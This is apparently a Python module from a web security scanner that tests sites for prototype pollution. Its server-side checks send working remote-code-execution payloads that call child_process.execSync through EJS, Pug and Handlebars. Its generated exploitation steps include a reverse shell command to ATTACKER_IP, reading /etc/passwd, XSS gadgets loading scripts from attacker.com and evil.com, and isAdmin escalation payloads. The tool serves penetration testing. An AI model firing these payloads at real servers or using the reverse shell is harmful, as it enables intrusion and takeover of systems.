"""
Prototype Pollution Scanner Module (Client-side + Server-side)

Detects prototype pollution vulnerabilities with strong proof:
1. Client-side: URL/Hash/JSON pollution → DOM XSS via gadgets
2. Server-side: Node.js RCE via EJS, Pug, Handlebars gadgets

Based on BlackFan's research + PortSwigger prototype pollution research:
https://github.com/BlackFan/client-side-prototype-pollution
https://portswigger.net/research/server-side-prototype-pollution
"""

from typing import List, Dict, Any, Set
from core.base_module import BaseModule
from core.logger import get_logger
from urllib.parse import urlparse, urlencode, parse_qs
import re
import json
import time

logger = get_logger(__name__)


class PrototypePollutionModule(BaseModule):
    """Prototype Pollution vulnerability scanner"""

    # Vulnerable library patterns - libraries known to be vulnerable to PP
    VULNERABLE_LIBRARIES = {
        # jQuery plugins
        'jquery.ba-bbq': {
            'pattern': r'jquery\.ba-bbq|deparam|jQuery\.deparam',
            'severity': 'high',
            'description': 'jQuery BBQ plugin - vulnerable to query string PP'
        },
        'jquery-deparam': {
            'pattern': r'jquery-deparam|\.deparam\s*=',
            'severity': 'high',
            'description': 'jQuery deparam - parses query strings unsafely'
        },
        'jquery.query-object': {
            'pattern': r'jquery\.query-object|jQuery\.query',
            'severity': 'high',
            'description': 'jQuery Query Object plugin'
        },
        'purl': {
            'pattern': r'purl\.js|jQuery\.url',
            'severity': 'high',
            'description': 'Purl jQuery URL parser'
        },
        'arg.js': {
            'pattern': r'arg\.js|Arg\s*=\s*\{',
            'severity': 'medium',
            'description': 'Arg.js URL parameter parser'
        },
        'qs': {
            'pattern': r'qs\.parse|querystring\.parse',
            'severity': 'medium',
            'description': 'qs/querystring library (older versions)'
        },
        'lodash-merge': {
            'pattern': r'_\.merge|lodash\.merge|merge\s*\([^)]+\)',
            'severity': 'medium',
            'description': 'Lodash merge (older versions vulnerable)'
        },
        'deep-extend': {
            'pattern': r'deep-extend|deepExtend',
            'severity': 'medium',
            'description': 'deep-extend library'
        },
        'url-parse': {
            'pattern': r'url-parse|urlParse',
            'severity': 'medium',
            'description': 'url-parse library (older versions)'
        },
    }

    # Known gadgets that can be exploited after PP
    KNOWN_GADGETS = {
        'jquery_ajax': {
            'pattern': r'\$\.ajax|\$\.get|\$\.post|\$\.getScript',
            'description': 'jQuery AJAX - can load arbitrary scripts'
        },
        'vue_template': {
            'pattern': r'Vue\s*\(|new\s+Vue|v-html|v-bind',
            'description': 'Vue.js - template injection possible'
        },
        'closure_base': {
            'pattern': r'CLOSURE_BASE_PATH|goog\.require',
            'description': 'Google Closure - script loading hijack'
        },
        'dompurify': {
            'pattern': r'DOMPurify|sanitize\s*\(',
            'description': 'DOMPurify - sanitizer bypass possible'
        },
        'segment_analytics': {
            'pattern': r'analytics\.js|segment\.com',
            'description': 'Segment Analytics - script injection'
        },
    }

    # Pollution indicators in response
    POLLUTION_INDICATORS = [
        'pptest',  # Our test property
        'polluted',  # Our test value
        '__proto__',  # Direct reflection
        'constructor',  # Constructor access
        '[object Object]',  # Prototype pollution side effect
    ]

    # Server-side RCE gadgets for Node.js
    SERVER_RCE_GADGETS = {
        'ejs': {
            'payload': {"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('echo PP_MARKER')//"}},
            'desc': 'EJS Template RCE',
            'severity': 'critical'
        },
        'pug': {
            'payload': {"__proto__": {"block": {"type": "Text", "val": "x;process.mainModule.require('child_process').execSync('echo PP_MARKER')//"}}},
            'desc': 'Pug Template RCE',
            'severity': 'critical'
        },
        'handlebars': {
            'payload': {"__proto__": {"pendingContent": "x]];process.mainModule.require('child_process').execSync('echo PP_MARKER')//"}},
            'desc': 'Handlebars RCE',
            'severity': 'critical'
        },
        'status_code': {
            'payload': {"__proto__": {"status": 510}},
            'desc': 'Status code pollution',
            'severity': 'high'
        },
        'json_spaces': {
            'payload': {"__proto__": {"json spaces": "PP_MARKER"}},
            'desc': 'Express JSON spaces pollution',
            'severity': 'medium'
        },
        'content_type': {
            'payload': {"__proto__": {"content-type": "application/x-www-form-urlencoded"}},
            'desc': 'Content-Type pollution',
            'severity': 'medium'
        },
    }

    def __init__(self, module_path: str, payload_limit: int = None):
        """Initialize Prototype Pollution module"""
        super().__init__(module_path, payload_limit=payload_limit)
        self.tested_urls: Set[str] = set()
        # Unique marker for detection
        self.marker = f"PP{int(time.time()) % 100000}"
        logger.info(f"Prototype Pollution module loaded: {len(self.payloads)} payloads, marker: {self.marker}")

    def scan(self, targets: List[Dict[str, Any]], http_client: Any) -> List[Dict[str, Any]]:
        """
        Scan for Prototype Pollution vulnerabilities

        Args:
            targets: List of URLs to scan
            http_client: HTTP client

        Returns:
            List of findings
        """
        results = []
        scanned_hosts = set()

        logger.info(f"Starting Prototype Pollution scan on {len(targets)} targets")

        for target in targets:
            url = target.get('url', '')
            if not url:
                continue

            # Extract host to avoid duplicate scans per domain
            parsed = urlparse(url)
            host_key = f"{parsed.scheme}://{parsed.netloc}"

            # First, analyze JavaScript for vulnerable libraries (once per host)
            if host_key not in scanned_hosts:
                scanned_hosts.add(host_key)
                lib_findings = self._analyze_js_for_vulnerable_libs(url, http_client)
                results.extend(lib_findings)

            # Test prototype pollution payloads (client-side)
            payload_findings = self._test_pollution_payloads(url, http_client)
            results.extend(payload_findings)

            # Test server-side RCE gadgets (Node.js)
            server_findings = self._test_server_side_rce(url, http_client)
            results.extend(server_findings)

            # Early exit if we found vulnerabilities
            if results and self.config.get('early_exit', False):
                break

        logger.info(f"Prototype Pollution scan complete: {len(results)} issues found")
        return results

    def _analyze_js_for_vulnerable_libs(self, url: str, http_client: Any) -> List[Dict[str, Any]]:
        """Analyze JavaScript code for vulnerable libraries"""
        results = []

        try:
            # Fetch the page
            response = http_client.get(url)
            if not response or not response.text:
                return results

            html_content = response.text

            # Extract script sources
            script_urls = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', html_content, re.I)
            inline_scripts = re.findall(r'<script[^>]*>(.*?)</script>', html_content, re.S | re.I)

            # Combine all JS content
            all_js_content = '\n'.join(inline_scripts)

            # Fetch external scripts (limit to avoid slowdown)
            parsed_base = urlparse(url)
            for script_url in script_urls[:10]:
                try:
                    if script_url.startswith('//'):
                        script_url = f"{parsed_base.scheme}:{script_url}"
                    elif script_url.startswith('/'):
                        script_url = f"{parsed_base.scheme}://{parsed_base.netloc}{script_url}"
                    elif not script_url.startswith('http'):
                        continue

                    script_resp = http_client.get(script_url)
                    if script_resp and script_resp.text:
                        all_js_content += '\n' + script_resp.text
                except:
                    pass

            # Check for vulnerable libraries
            found_libs = []
            found_gadgets = []

            for lib_name, lib_info in self.VULNERABLE_LIBRARIES.items():
                if re.search(lib_info['pattern'], all_js_content, re.I):
                    found_libs.append((lib_name, lib_info))

            for gadget_name, gadget_info in self.KNOWN_GADGETS.items():
                if re.search(gadget_info['pattern'], all_js_content, re.I):
                    found_gadgets.append((gadget_name, gadget_info))

            # Create findings for vulnerable libraries
            if found_libs:
                lib_names = [l[0] for l in found_libs]
                result = self.create_result(
                    vulnerable=True,
                    url=url,
                    parameter='JavaScript Libraries',
                    payload='Static Analysis',
                    evidence=f"Vulnerable libraries detected:\n" +
                             '\n'.join([f"  - {l[0]}: {l[1]['description']}" for l in found_libs]),
                    description=f"Potential prototype pollution via vulnerable libraries: {', '.join(lib_names)}",
                    confidence=0.75
                )
                result['cwe'] = self.config.get('cwe', 'CWE-1321')
                result['severity'] = 'high' if any(l[1]['severity'] == 'high' for l in found_libs) else 'medium'
                result['recommendation'] = (
                    'Update or replace vulnerable JavaScript libraries. '
                    'Use Object.create(null) for safe object creation. '
                    'Filter __proto__ and constructor keys from user input.'
                )
                result['gadgets'] = [g[0] for g in found_gadgets] if found_gadgets else []
                results.append(result)

        except Exception as e:
            logger.debug(f"Error analyzing JS for {url}: {e}")

        return results

    def _test_pollution_payloads(self, url: str, http_client: Any) -> List[Dict[str, Any]]:
        """Test prototype pollution payloads"""
        results = []
        parsed = urlparse(url)

        # Get baseline response
        try:
            baseline = http_client.get(url)
            if not baseline:
                return results
            baseline_length = len(baseline.text) if baseline.text else 0
        except:
            return results

        # Test each payload
        for payload_line in self.payloads[:self.payload_limit]:
            payload_line = payload_line.strip()
            if not payload_line or payload_line.startswith('#'):
                continue

            # Parse payload type
            if ':' in payload_line:
                payload_type, payload = payload_line.split(':', 1)
            else:
                payload_type = 'QUERY'
                payload = payload_line

            try:
                finding = None

                if payload_type == 'QUERY':
                    finding = self._test_query_pollution(url, payload, http_client, baseline_length)
                elif payload_type == 'HASH':
                    finding = self._test_hash_pollution(url, payload, http_client, baseline_length)
                elif payload_type == 'JSON':
                    finding = self._test_json_pollution(url, payload, http_client, baseline_length)

                if finding:
                    results.append(finding)
                    # Early exit on first finding per URL
                    if self.config.get('early_exit', True):
                        break

            except Exception as e:
                logger.debug(f"Error testing payload {payload}: {e}")

        return results

    def _test_query_pollution(self, url: str, payload: str, http_client: Any, baseline_len: int) -> Dict[str, Any]:
        """Test query parameter prototype pollution"""
        parsed = urlparse(url)

        # Build test URL with pollution payload
        separator = '&' if parsed.query else '?'
        test_url = f"{url}{separator}{payload}"

        try:
            response = http_client.get(test_url)
            if not response:
                return None

            # Check for pollution indicators
            pollution_detected, evidence = self._check_pollution_evidence(response.text, payload)

            if pollution_detected:
                exploitation_steps = self._generate_client_pp_steps(url, 'query', payload)
                return self.create_result(
                    vulnerable=True,
                    url=url,
                    parameter='__proto__',
                    payload=payload,
                    evidence=evidence,
                    description=f"Prototype pollution via query parameter: {payload.split('=')[0]}",
                    confidence=0.80,
                    exploitation_steps=exploitation_steps
                )

        except Exception as e:
            logger.debug(f"Error testing query pollution: {e}")

        return None

    def _test_hash_pollution(self, url: str, payload: str, http_client: Any, baseline_len: int) -> Dict[str, Any]:
        """Test hash-based prototype pollution"""
        # Hash-based pollution requires client-side testing
        # We can only detect vulnerable patterns statically
        # This is a placeholder for browser-based testing
        return None

    def _test_json_pollution(self, url: str, payload: str, http_client: Any, baseline_len: int) -> Dict[str, Any]:
        """Test JSON body prototype pollution"""
        try:
            # Try to parse the JSON payload
            json_data = json.loads(payload)

            headers = {'Content-Type': 'application/json'}
            response = http_client.post(url, json=json_data, headers=headers)

            if not response:
                return None

            # Check for pollution indicators or error messages
            pollution_detected, evidence = self._check_pollution_evidence(response.text, payload)

            # Also check for server-side pollution indicators
            if response.status_code == 500:
                # Server error might indicate prototype pollution crash
                if any(ind in str(response.text).lower() for ind in ['prototype', 'cannot read property', 'undefined']):
                    return self.create_result(
                        vulnerable=True,
                        url=url,
                        parameter='JSON Body',
                        payload=payload,
                        evidence=f"Server error with prototype keywords: {response.text[:200]}",
                        description="Potential server-side prototype pollution (caused server error)",
                        confidence=0.65
                    )

            if pollution_detected:
                exploitation_steps = self._generate_client_pp_steps(url, 'json', payload)
                return self.create_result(
                    vulnerable=True,
                    url=url,
                    parameter='JSON Body',
                    payload=payload,
                    evidence=evidence,
                    description="Prototype pollution via JSON body",
                    confidence=0.75,
                    exploitation_steps=exploitation_steps
                )

        except json.JSONDecodeError:
            pass
        except Exception as e:
            logger.debug(f"Error testing JSON pollution: {e}")

        return None

    def _test_server_side_rce(self, url: str, http_client: Any) -> List[Dict[str, Any]]:
        """Test server-side prototype pollution with RCE gadgets"""
        results = []

        # Test each server-side gadget
        for gadget_name, gadget_info in self.SERVER_RCE_GADGETS.items():
            try:
                # Prepare payload with our marker
                payload_template = gadget_info['payload']
                payload_str = json.dumps(payload_template).replace('PP_MARKER', self.marker)
                payload_json = json.loads(payload_str)

                headers = {'Content-Type': 'application/json'}

                # Send polluted request
                response = http_client.post(url, json=payload_json, headers=headers)
                if not response:
                    continue

                # Check for evidence of successful pollution
                evidence = []
                is_vulnerable = False
                confidence = 0.0

                # Check for marker reflection (RCE proof)
                if self.marker in (response.text or ''):
                    evidence.append(f"Marker '{self.marker}' reflected in response - RCE confirmed!")
                    is_vulnerable = True
                    confidence = 0.95

                # Check for status code pollution
                if gadget_name == 'status_code' and response.status_code == 510:
                    evidence.append(f"Status code changed to 510 (polluted value)")
                    is_vulnerable = True
                    confidence = 0.90

                # Check for JSON spaces pollution (Express)
                if gadget_name == 'json_spaces':
                    # Send a request that returns JSON to see if spacing changed
                    try:
                        test_resp = http_client.get(url)
                        if test_resp and test_resp.text:
                            if self.marker in test_resp.text:
                                evidence.append("JSON spaces pollution detected")
                                is_vulnerable = True
                                confidence = 0.80
                    except:
                        pass

                # Check for characteristic error messages
                error_indicators = [
                    ('outputFunctionName', 'EJS'),
                    ('pendingContent', 'Handlebars'),
                    ('child_process', 'Node.js RCE'),
                    ('mainModule', 'Node.js RCE'),
                    ('require', 'Module access'),
                ]

                resp_text = response.text or ''
                for indicator, indicator_type in error_indicators:
                    if indicator in resp_text.lower():
                        evidence.append(f"Server reflected {indicator_type} keyword")
                        if not is_vulnerable:
                            is_vulnerable = True
                            confidence = 0.70

                # Check for 500 error with prototype-related message
                if response.status_code == 500:
                    proto_errors = ['prototype', '__proto__', 'constructor', 'cannot read', 'cannot set']
                    for err in proto_errors:
                        if err in resp_text.lower():
                            evidence.append(f"Server error with prototype keyword: '{err}'")
                            is_vulnerable = True
                            confidence = max(confidence, 0.75)
                            break

                if is_vulnerable:
                    # Generate exploitation steps
                    exploitation_steps = self._generate_server_rce_steps(
                        url, gadget_name, gadget_info, payload_json
                    )

                    result = self.create_result(
                        vulnerable=True,
                        url=url,
                        parameter='JSON Body (__proto__)',
                        payload=payload_str,
                        evidence='\\n'.join(evidence),
                        description=f"Server-side Prototype Pollution: {gadget_info['desc']}",
                        confidence=confidence,
                        exploitation_steps=exploitation_steps
                    )
                    result['cwe'] = 'CWE-1321'
                    result['severity'] = gadget_info['severity']
                    result['gadget'] = gadget_name
                    result['recommendation'] = (
                        'Sanitize all user input before merging into objects. '
                        'Use Object.create(null) for safe objects. '
                        'Block __proto__, constructor, and prototype keys. '
                        'Update vulnerable libraries (lodash, merge-deep, etc).'
                    )
                    results.append(result)

                    # Found critical RCE - can stop testing this gadget category
                    if gadget_info['severity'] == 'critical':
                        break

            except Exception as e:
                logger.debug(f"Error testing {gadget_name} gadget: {e}")

        return results

    def _generate_server_rce_steps(self, url: str, gadget_name: str, gadget_info: Dict, payload: Dict) -> List[str]:
        """Generate exploitation steps for server-side prototype pollution"""
        steps = []

        steps.append(f"=== Server-Side Prototype Pollution Exploitation ({gadget_info['desc']}) ===")
        steps.append(f"Target: {url}")
        steps.append("")

        if gadget_name in ['ejs', 'pug', 'handlebars']:
            steps.append("STEP 1: Confirm RCE Capability")
            steps.append("Send this payload via JSON POST:")
            steps.append(f"```")
            steps.append(f"POST {url}")
            steps.append(f"Content-Type: application/json")
            steps.append(f"")
            steps.append(json.dumps(payload, indent=2))
            steps.append(f"```")
            steps.append("")

            steps.append("STEP 2: Execute Commands (CAUTION - for authorized testing only)")
            if gadget_name == 'ejs':
                rce_payload = {
                    "__proto__": {
                        "outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');//"
                    }
                }
            elif gadget_name == 'pug':
                rce_payload = {
                    "__proto__": {
                        "block": {
                            "type": "Text",
                            "val": "x;process.mainModule.require('child_process').execSync('id');//"
                        }
                    }
                }
            else:  # handlebars
                rce_payload = {
                    "__proto__": {
                        "pendingContent": "x]];process.mainModule.require('child_process').execSync('id');//"
                    }
                }

            steps.append(f"```json")
            steps.append(json.dumps(rce_payload, indent=2))
            steps.append(f"```")
            steps.append("")

            steps.append("STEP 3: Reverse Shell (Authorized Testing Only)")
            steps.append("Replace command with: bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1")
            steps.append("")

            steps.append("STEP 4: Alternative - Read Sensitive Files")
            steps.append(f"Change execSync to: cat /etc/passwd")
            steps.append(f"Or for Windows: type C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts")

        elif gadget_name == 'status_code':
            steps.append("STEP 1: Confirm Status Code Pollution")
            steps.append(f"```json")
            steps.append(json.dumps({"__proto__": {"status": 510}}, indent=2))
            steps.append(f"```")
            steps.append("")
            steps.append("STEP 2: Impact Assessment")
            steps.append("- Can manipulate application logic dependent on status codes")
            steps.append("- May bypass security controls checking response status")
            steps.append("- Potential for cache poisoning via status manipulation")

        elif gadget_name == 'json_spaces':
            steps.append("STEP 1: Confirm JSON Spaces Pollution")
            steps.append(f"```json")
            steps.append(json.dumps({"__proto__": {"json spaces": 10}}, indent=2))
            steps.append(f"```")
            steps.append("")
            steps.append("STEP 2: Escalate - Try Express Options Pollution")
            steps.append("Test other Express options: 'x-powered-by', 'etag', 'views'")

        elif gadget_name == 'content_type':
            steps.append("STEP 1: Confirm Content-Type Pollution")
            steps.append(f"```json")
            steps.append(json.dumps(payload, indent=2))
            steps.append(f"```")
            steps.append("")
            steps.append("STEP 2: Impact - Response Type Manipulation")
            steps.append("- Can change how server interprets subsequent requests")
            steps.append("- May enable parameter pollution or injection attacks")

        steps.append("")
        steps.append("=== Additional Test Payloads ===")
        steps.append("Constructor notation (bypasses some filters):")
        steps.append('{"constructor": {"prototype": {"isAdmin": true}}}')
        steps.append("")
        steps.append("Nested pollution:")
        steps.append('{"__proto__": {"__proto__": {"polluted": true}}}')

        return steps

    def _generate_client_pp_steps(self, url: str, vector_type: str, payload: str) -> List[str]:
        """Generate exploitation steps for client-side prototype pollution"""
        steps = []

        steps.append(f"=== Client-Side Prototype Pollution Exploitation ===")
        steps.append(f"Target: {url}")
        steps.append(f"Vector: {vector_type.upper()}")
        steps.append("")

        if vector_type == 'query':
            steps.append("STEP 1: Reproduce the Pollution")
            steps.append(f"Open browser and navigate to:")
            steps.append(f"  {url}?{payload}")
            steps.append("")
            steps.append("STEP 2: Verify Pollution in Browser Console")
            steps.append("Open DevTools (F12) → Console, then run:")
            steps.append("  ({}).polluted")
            steps.append("If returns our value, pollution successful!")
            steps.append("")
            steps.append("STEP 3: DOM XSS via Known Gadgets")
            steps.append("jQuery $.ajax gadget:")
            steps.append(f"  {url}?__proto__[url]=//attacker.com/xss.js&__proto__[dataType]=script")
            steps.append("")
            steps.append("jQuery $.get gadget:")
            steps.append(f"  {url}?__proto__[src]=data:,alert(1)//")
            steps.append("")
            steps.append("Vue.js gadget:")
            steps.append(f"  {url}?__proto__[v-html]=<img src=x onerror=alert(1)>")
            steps.append("")
            steps.append("STEP 4: Account Takeover via isAdmin")
            steps.append(f"  {url}?__proto__[isAdmin]=true")
            steps.append(f"  {url}?__proto__[role]=admin")
            steps.append("")

        elif vector_type == 'json':
            steps.append("STEP 1: Reproduce via Fetch/XHR")
            steps.append("```javascript")
            steps.append(f"fetch('{url}', {{")
            steps.append("  method: 'POST',")
            steps.append("  headers: {'Content-Type': 'application/json'},")
            steps.append(f"  body: '{payload}'")
            steps.append("});")
            steps.append("```")
            steps.append("")
            steps.append("STEP 2: Test for Persistent Pollution")
            steps.append("After sending payload, check if Object.prototype is polluted:")
            steps.append("  ({}).polluted")
            steps.append("")
            steps.append("STEP 3: Common JSON Payloads")
            steps.append('{"__proto__": {"isAdmin": true}}')
            steps.append('{"constructor": {"prototype": {"isLoggedIn": true}}}')
            steps.append('{"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}}')
            steps.append("")

        elif vector_type == 'hash':
            steps.append("STEP 1: Test Hash-based Pollution")
            steps.append(f"  {url}#__proto__[polluted]=true")
            steps.append(f"  {url}#constructor.prototype.polluted=true")
            steps.append("")
            steps.append("STEP 2: Verify in Console")
            steps.append("  ({}).polluted // should return 'true'")
            steps.append("")

        steps.append("=== Known Vulnerable Libraries ===")
        steps.append("- jQuery BBQ/deparam (parses hash)")
        steps.append("- Lodash merge (< 4.17.5)")
        steps.append("- deep-extend")
        steps.append("- qs (< 6.3.0)")
        steps.append("- url-parse (< 1.4.3)")
        steps.append("")
        steps.append("=== Useful Gadgets Cheatsheet ===")
        steps.append("Bypass sanitizers: __proto__[ALLOW_DATA_ATTR]=true")
        steps.append("jQuery script load: __proto__[url]=//evil.com/xss.js")
        steps.append("Google Closure: __proto__[CLOSURE_BASE_PATH]=//evil.com/")
        steps.append("Segment Analytics: __proto__[cdn]=//evil.com")

        return steps

    def _check_pollution_evidence(self, response_text: str, payload: str) -> tuple:
        """Check response for evidence of successful pollution"""
        if not response_text:
            return False, ''

        evidence_found = []

        # Check for our test markers
        if 'pptest' in payload.lower():
            if 'polluted' in response_text.lower():
                evidence_found.append("Test value 'polluted' reflected in response")

        # Check for error messages indicating pollution
        pollution_errors = [
            'cannot read property',
            'cannot set property',
            'prototype',
            '__proto__',
            'object object',
            'undefined is not',
            'null is not',
        ]

        for error in pollution_errors:
            if error in response_text.lower():
                evidence_found.append(f"Pollution-related error: '{error}'")

        # Check for prototype access in response
        if '__proto__' in response_text or 'constructor.prototype' in response_text:
            evidence_found.append("Prototype keywords reflected in response")

        if evidence_found:
            return True, '\n'.join(evidence_found)

        return False, ''


def get_module(module_path: str, payload_limit: int = None):
    """Factory function to create module instance"""
    return PrototypePollutionModule(module_path, payload_limit=payload_limit)
